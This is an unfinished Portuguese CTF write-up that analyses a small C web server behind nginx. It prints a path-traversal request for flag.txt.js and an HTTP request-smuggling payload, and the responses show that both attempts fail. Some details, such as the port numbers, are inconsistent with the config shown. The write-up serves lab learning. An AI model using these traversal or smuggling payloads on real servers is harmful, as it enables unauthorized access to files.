# Duckware Team - Desafio do Pira

###### This CTF was (not yet) solved by @0xpics

> This CTF is about Web, path transversal, HTTP Smuggling

## Sobre desafio

Este desafio desafia o usuário a conseguir explorar suas vulnerabilidades e superar suas porteções afim de invadir diretórios escondidos

## O Desafio

Quando configuramos o Docker conseguimos uma paginade web com alguns artigos, podemos ler esse arquivo mas nada mais no site.

Porém temos todos os arquivos usados para o site, inclusive o codigo fonte, vamos análisa-lo então:

```
#include <sys/types.h>
#include <sys/socket.h>
#include <stdio.h>
#include <netinet/in.h>
#include <signal.h>
#include <unistd.h>
#include <string.h>
#include <stdlib.h>
#include <stdbool.h>

#define PORT 8000
#define BUFFER_SIZE 1024

typedef struct {
    char *content;
    int size;
} FileWithSize;

bool ends_with(char *text, char *suffix) {
    int text_length = strlen(text);
    int suffix_length = strlen(suffix);

    return text_length >= suffix_length && \
           strncmp(text+text_length-suffix_length, suffix, suffix_length) == 0;
}

FileWithSize *read_file(char *filename) {
    if (!ends_with(filename, ".html") && !ends_with(filename, ".png") && !ends_with(filename, ".css") && !ends_with(filename, ".js")) return NULL;

    char real_path[BUFFER_SIZE];
    snprintf(real_path, sizeof(real_path), "public/%s", filename);

    FILE *fd = fopen(real_path, "r");
    if (!fd) return NULL;

    fseek(fd, 0, SEEK_END);
    long filesize = ftell(fd);
    fseek(fd, 0, SEEK_SET);

    char *content = malloc(filesize + 1);
    if (!content) return NULL;

    fread(content, 1, filesize, fd);
    content[filesize] = '\0';

    fclose(fd);

    FileWithSize *file = malloc(sizeof(FileWithSize));
    file->content = content;
    file->size = filesize;
 
    return file;
}

void build_response(int socket_id, int status_code, char* status_description, FileWithSize *file) {
    char *response_body_fmt = 
        "HTTP/1.1 %u %s\r\n"
        "Server: mystiz-web/1.0.0\r\n"
        "Content-Type: text/html\r\n"
        "Connection: %s\r\n"
        "Content-Length: %u\r\n"
        "\r\n";
    char response_body[BUFFER_SIZE];

    sprintf(response_body,
            response_body_fmt,
            status_code,
            status_description,
            status_code == 200 ? "keep-alive" : "close",
            file->size);
    write(socket_id, response_body, strlen(response_body));
    write(socket_id, file->content, file->size);
    free(file->content);
    free(file);
    return;
}

void handle_client(int socket_id) {
    char buffer[BUFFER_SIZE];
    char requested_filename[BUFFER_SIZE];

    while (1) {
        memset(buffer, 0, sizeof(buffer));
        memset(requested_filename, 0, sizeof(requested_filename));

        if (read(socket_id, buffer, BUFFER_SIZE) == 0) return;

        if (sscanf(buffer, "GET /%s", requested_filename) != 1)
            return build_response(socket_id, 500, "Internal Server Error", read_file("500.html"));

        FileWithSize *file = read_file(requested_filename);
        if (!file)
            return build_response(socket_id, 404, "Not Found", read_file("404.html"));

        build_response(socket_id, 200, "OK", file);
    }
}

int main() {
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stderr, NULL, _IONBF, 0);

    struct sockaddr_in server_address;
    struct sockaddr_in client_address;

    int socket_id = socket(AF_INET, SOCK_STREAM, 0);
    server_address.sin_family = AF_INET;
    server_address.sin_addr.s_addr = htonl(INADDR_ANY);
    server_address.sin_port = htons(PORT);

    if (bind(socket_id, (struct sockaddr*)&server_address, sizeof(server_address)) == -1) exit(1);
    if (listen(socket_id, 5) < 0) exit(1);

    while (1) {
        int client_address_len;
        int new_socket_id = accept(socket_id, (struct sockaddr *)&client_address, (socklen_t*)&client_address_len);
        if (new_socket_id < 0) exit(1);
        int pid = fork();
        if (pid == 0) {
            handle_client(new_socket_id);
            close(new_socket_id);
        }
    }
}
```

A vulnerabilidade do código é path transversal, e ela fica clara no seguinte trecho:

```
snprintf(real_path, sizeof(real_path), "public/%s", filename);
```

Esse trecho concatena o diretório `public`, diretório onde está presente todas os diretórios do site, com a função filename, que nomeia os arquivos. Porém nessa concatenação não ocorre uma verificação de uma técnica com `../` tornando livre a exploração de todos os diretórios armazenados através do public.

Porém antes de começarmos o path transversal precisamos checar outros pontos importantes do código:

O trecho `#define BUFFER_SIZE 1024` indica define um tamanho fixo para os buffers usados no código, esse trecho entra em ação graças a `sscanf(buffer, "GET /%s", requested_filename)`, que não limita o tamanho no dado lido em `GET`.

Por fim, para iniciarmos o Path Transversal precisamos analisar esta última parte do código:
```
if (!ends_with(filename, ".html") && !ends_with(filename, ".png") && !ends_with(filename, ".css") && !ends_with(filename, ".js")) 
    return NULL;
```

Este trecho no código usa a função `ends_with()` checa se o arquivo termina em `.html`, `.png`, `.css`, e `.js`

Se nenhuma dessas extensões for encontrada, a função retorna `NULL` (indicando erro).

Concluindo, precisamos então de um path transversal que estoure o BUFFER do código, parta de GET e termine com alguma das extensões listadas.

Capturando a requisição por BurpSuite e inserindo o seguinte Path Transversal:

```
GET /../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../flag.txt.js
```

Recebemos a seguinte resposta:

```
HTTP/1.1 400 Bad Request
Server: nginx/1.27.1
Date: Fri, 04 Apr 2025 20:06:45 GMT
Content-Type: text/html
Content-Length: 157
Connection: close

<html>
<head><title>400 Bad Request</title></head>
<body>
<center><h1>400 Bad Request</h1></center>
<hr><center>nginx/1.27.1</center>
</body>
</html>
```

Não conseguimos a resposta espera, mas há algo interessante também:

`nginx/1.27.1`

Explorando o arquivo `nginx.conf` dado a nós, podemos achar a seguinte configuração:

```
user www-data;

thread_pool default threads=1 max_queue=65536;

events {
    worker_connections 1024;
}

http {
    upstream backend {
        server web:8000;
        keepalive 32;
    }

    server {
        listen 80;
        server_name proxy;

        location / {
            proxy_pass http://backend;
            proxy_set_header Host $host;
        }
    }
}
```

O porblema aqui é que o proxy do nginx encaminha a URL processada para o backend, localizada na porta `8080` enquanto nós estamos na porta `8081`. Em outras palavras, o truque de path traversal que tentamos usar não funciona porque o Nginx remove os `../` antes de passar a requisição para o backend.

Temos então que voltar ao código original e reanalisar o código para descobrir como passar por isso.

```
void handle_client(int socket_id) {
    char buffer[BUFFER_SIZE];
    char requested_filename[BUFFER_SIZE];

    while (1) {
        memset(buffer, 0, sizeof(buffer));
        memset(requested_filename, 0, sizeof(requested_filename));

        if (read(socket_id, buffer, BUFFER_SIZE) == 0) return;

        if (sscanf(buffer, "GET /%s", requested_filename) != 1)
            return build_response(socket_id, 500, "Internal Server Error", read_file("500.html"));

        FileWithSize *file = read_file(requested_filename);
        if (!file)
            return build_response(socket_id, 404, "Not Found", read_file("404.html"));

        build_response(socket_id, 200, "OK", file);
    }
}
```

No fim do código  é possível observar que, se a requisição for bem-sucedida, não há um retorno imediato (a função não encerra), e o servidor continua lendo dados do buffer. Isso permite enviarmos mais de uma requisição ao mesmo tempo realizando um ataque de HTTP smuggling.

Vamos mudar nossa requisição para o seguinte:

```
POST / HTTP/1.1
Host: localhost:8081
Content-Length: 2165
Connection: keep-alive

AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA GET /../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../flag.txt.js HTTP/1.1
Host: web


GET /index.html HTTP/1.1
Host: localhost:8081
Content-Length: 0
Connection: keep-alive
```

Porém recebo a seguinte resposta:

```
HTTP/1.1 500 Internal Server Error
Server: nginx/1.27.1
Date: Fri, 04 Apr 2025 20:41:47 GMT
Content-Type: text/html
Content-Length: 1241
Connection: keep-alive

<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>500 - Internal Server Error</title>
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
  <style>
    body {
      height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
      background-color: #f8f9fa;
    }
    .error-container {
      text-align: center;
    }
    .error-container h1 {
      font-size: 10rem;
      font-weight: bold;
    }
    .error-container h2 {
      font-size: 2rem;
      color: #6c757d;
    }
    .error-container p {
      color: #6c757d;
    }
    .btn-home {
      background-color: #007bff;
      color: #fff;
      padding: 0.75rem 1.25rem;
      font-size: 1.25rem;
    }
  </style>
</head>
<body>

  <div class="error-container">
    <h1>500</h1>
    <h2>Internal Server Error</h2>
    <p>Something went wrong on our side. Please try refreshing the page or come back later.</p>
    <a href="/index.html" class="btn btn-home">Go Back</a>
  </div>

  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
</body>
</html>

```
